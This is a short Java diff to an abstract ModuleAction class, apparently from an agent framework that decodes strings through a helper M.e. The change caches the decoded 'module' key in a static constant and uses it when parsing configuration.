@@ -23,6 +23,7 @@ abstract class ModuleAction extends SubAction {
 	private static final String TAG = "AgentAction"; //$NON-NLS-1$
 
 	protected String moduleId;
+	protected static final java.lang.String moduleStr = M.e("module");
 
 	/**
 	 * Instantiates a new stop agent action.
@@ -38,7 +39,7 @@ abstract class ModuleAction extends SubAction {
 	protected boolean parse(ConfAction params) {
 
 		try {
-			this.moduleId = params.getString(M.e("module"));
+			this.moduleId = params.getString(moduleStr);
 		} catch (ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
